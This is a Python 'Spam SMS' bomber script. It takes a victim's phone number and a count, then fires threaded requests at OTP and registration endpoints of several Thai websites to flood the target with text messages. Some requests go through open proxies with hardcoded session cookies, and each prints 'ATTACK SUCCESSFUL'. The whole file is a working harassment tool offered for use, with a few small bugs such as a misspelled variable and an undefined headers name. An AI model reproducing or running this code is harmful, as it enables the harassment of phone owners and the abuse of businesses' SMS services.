import requests,json,time, sys, threading, random, os, time, sys
from threading import Thread

os.system('cls')
os.system(f'cls & mode 120,30 & title [ Spam SMS ] - Make By Darren`s #8946')
print('''
   \033[0;33m██████╗  \033[0;33m███████╗  \033[0;33m██╗  ██╗
   \033[0;33m██╔══██╗ \033[0;33m██╔════╝  \033[0;33m╚██╗██╔╝
   \033[0;33m██████╔╝ \033[0;33m█████╗     \033[0;33m╚███╔╝
   \033[0;33m██╔══██╗ \033[0;33m██╔══╝     \033[0;33m██╔██╗
   \033[0;33m██║  ██║ \033[0;33m███████╗  \033[0;33m██╔╝╚██╗
   \033[0;33m╚═╝  ╚═╝ \033[0;33m╚══════╝  \033[0;33m╚═╝  ╚═╝
\033[0;33mMade By Darren`s #8946 \033[0;37m| \033[0;33mhttps://discord.gg/s7VrpWAYN8 
''')
phonenumber = input("\033[0;33m[\033[0;37m+\033[0;33m] \033[0;37m> \033[0;33mPhone Number \033[0;37m:\033[0;37m ")
hi = int(input("\033[0;33m[\033[0;37m+\033[0;33m] \033[0;37m> \033[0;33mAmount \033[0;37m:\033[0;37m "))


def prettygaming():
	requests.post("https://prettygaming168-api.auto888.cloud/api/v3/otp/send", data = {"tel":phonenumber,"otp_type":"register"}, headers = {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36"}, proxies = {"http": "http://182.52.103.144:8080"})
	print("\033[0;33m[\033[0;37m+\033[0;33m] \033[0;37m-> \033[0;33mATTACK SUCCESSFUL")

def berlnw():
	requests.post("https://www.berlnw.com/reservelogin",data={"p_myreserve": phonenumber}, headers={"Host": "www.berlnw.com", "Connection": "keep-alive", "Upgrade-Insecure-Requests": "1", "Content-Type": "application/x-www-form-urlencoded", "Save-Data": "on", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Referer": "https://www.berlnw.com/myaccount", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "th-TH,th;q=0.9,en;q=0.8", "Cookie": "berlnw=s%3AaKEA2ULex-QQ7U6jr0WCQGs-Mz3eJFJn.RsAXcleV2EVFN4j%2BPqDivbqSYAta0UYtyoM65BrxuV0; _referrer_og=https%3A%2F%2Fwww.google.com%2F; _first_pageview=1; _jsuid=4035440860; _ga=GA1.2.766623232.1635154743; _gid=GA1.2.1857466267.1635154743; _gac_UA-90695720-1=1.1635154743.CjwKCAjwq9mLBhB2EiwAuYdMtU_gp7mSvFcH4kByOTGf-LsmLTGujv9qCwMi1xwWSuEiQSOlODmN-RoCMu4QAvD_BwE; _fbp=fb.1.1635154742776.771793600; _gat_gtag_UA_90695720_1=1"}, proxies = {"http": "http://182.52.103.144:8080"})
	print("\033[0;33m[\033[0;37m+\033[0;33m] \033[0;37m-> \033[0;33mATTACK SUCCESSFUL")

def foodland():
	requests.post("https://shop.foodland.co.th/login/generation", data={"phone": phonenumber}, proxies = {"http": "http://182.52.103.144:8080"})
	print("\033[0;33m[\033[0;37m+\033[0;33m] \033[0;37m-> \033[0;33mATTACK SUCCESSFUL")

def ondemand():
	requests.post("https://shoponline.ondemand.in.th/OtpVerification/VerifyOTP/SendOtp", data = "phone="+phonenumber+"&type=phone&resend=0&pinid=", headers = {"accept": "application/json, text/javascript, */*; q=0.01", "content-type": "application/x-www-form-urlencoded; charset=UTF-8", "x-requested-with": "XMLHttpRequest", "user-agent": "Mozilla/5.0 (Linux; Android 5.1; A1601) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36", "cookie": "sqzllocal=sqzl614a950a0000008a8892;private_content_version=a8f313c36d800596d69c0634f8364ba7;PHPSESSID=0bfasg27occf98ngcr0p3mqlt7;_gcl_au=1.1.1797077583.1635431429;_hjid=16751239-bad6-46a9-b2f0-01bb94d26f2b;sqzl_session_id=617ab409000003ef5950|1635431433.703;_ga=GA1.4.1468961660.1635431432;_gid=GA1.4.108830963.1635431434;_gid=GA1.3.108830963.1635431434;_fbp=fb.2.1635431435074.169114230;sqzl_abs=0;_hjIncludedInPageviewSample=1;_hjAbsoluteSessionInProgress=0;_hjIncludedInSessionSample=1;mage-cache-storage=%7B%7D;mage-cache-storage-section-invalidation=%7B%7D;mage-cache-sessid=true;form_key=Pl5vFXKEPwQqulEz;mage-messages=;recently_viewed_product=%7B%7D;recently_viewed_product_previous=%7B%7D;recently_compared_product=%7B%7D;recently_compared_product_previous=%7B%7D;product_data_storage=%7B%7D;_ga_V7G71JV0ES=GS1.1.1635431429.1.1.1635431596.18;_ga=GA1.3.1468961660.1635431432;section_data_ids=%7B%22messages%22%3A1635431607%2C%22customer%22%3A1635431607%2C%22compare-products%22%3A1635431607%2C%22last-ordered-items%22%3A1635431607%2C%22cart%22%3A1635431742%2C%22directory-data%22%3A1635431607%2C%22instant-purchase%22%3A1635431607%2C%22persistent%22%3A1635431607%2C%22review%22%3A1635431607%2C%22wishlist%22%3A1635431607%2C%22ammessages%22%3A1635431607%2C%22gtm%22%3A1635431607%2C%22recently_viewed_product%22%3A1635431607%2C%22recently_compared_product%22%3A1635431607%2C%22product_data_storage%22%3A1635431607%2C%22paypal-billing-agreement%22%3A1635431607%2C%22checkout-fields%22%3A1635431607%2C%22collection-point-result%22%3A1635431607%7D"})
	print("\033[0;33m[\033[0;37m+\033[0;33m] \033[0;37m-> \033[0;33mATTACK SUCCESSFUL")

def pizza():
	requests.post("https://api.1112delivery.com/api/v1/otp/create", data = {"phonenumber":""+phonenumber+"","language":"th"}, headers = {})
	print("\033[0;33m[\033[0;37m+\033[0;33m] \033[0;37m-> \033[0;33mATTACK SUCCESSFUL")

def kitchenhub():
	requests.post("https://www.kaitorasap.co.th/api/index.php/send-otp/", data="phone_number="+phonenumber+"&lag=", headers={"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","Cookie": "PHPSESSID=f5nrukmps3fa5gk25eh4v0tgg0; _ga=GA1.3.1240095898.1635597163; _gid=GA1.3.747741928.1635597163; _gat_gtag_UA_141105037_1=1"},proxies = {"http": "http://185.104.252.10:9090"})
	print("\033[0;33m[\033[0;37m+\033[0;33m] \033[0;37m-> \033[0;33mATTACK SUCCESSFUL")

def fox888():
	requests.post("https://www.fox888.com/api/otp/register", data = "applicant="+phonenumber+"&serviceName=FOX888", headers = {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36", "content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Accept": "*/*", "X-Requested-With": "XMLHttpRequest"})
	print("\033[0;33m[\033[0;37m+\033[0;33m] \033[0;37m-> \033[0;33mATTACK SUCCESSFUL")

def kaitorasap():
	requests.post("https://www.kaitorasap.co.th/api/index.php/send-otp/", data = "phone_number="+phonenumbe+"r&lag=", headers = {"Host": "www.kaitorasap.co.th", "Connection": "keep-alive", "Accept": "application/json, text/javascript, */*; q=0.01", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-with": "XMLHttpRequest", "User-Agent": "Mozilla/5.0 (Linux; Android 5.1; A1601) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36", "Referer": "https://www.kaitorasap.co.th/login/", "Accept-Encoding": "gzip, deflate, br", "Accept-Encoding": "th-TH,th;q=0.9,en;q=0.8", "Cookie": "PHPSESSID=p6jos17e5m0nkc1bmt0trlcrv4; _ga=GA1.3.1940619970.1635597478; _gid=GA1.3.1491460319.1635597478; _gat_gtag_UA_141105037_1=1"})
	print("\033[0;33m[\033[0;37m+\033[0;33m] \033[0;37m-> \033[0;33mATTACK SUCCESSFUL")

def delivery1112(phone):
    requests.post('https://api.1112delivery.com/api/v1/otp/create',json={"phonenumber":phone,"language":"th"},headers=headers)
    print("\033[0;33m[\033[0;37m+\033[0;33m] \033[0;37m-> \033[0;33mATTACK SUCCESSFUL")



for i in range(hi):
    
	threading.Thread(target=kitchenhub).start()
	threading.Thread(target=pizza).start()
	threading.Thread(target=ondemand).start()
	threading.Thread(target=foodland).start()
	threading.Thread(target=berlnw).start()
	threading.Thread(target=prettygaming).start()
	threading.Thread(target=fox888).start()
	threading.Thread(target=kaitorasap).start()
	threading.Thread(target=delivery1112).start()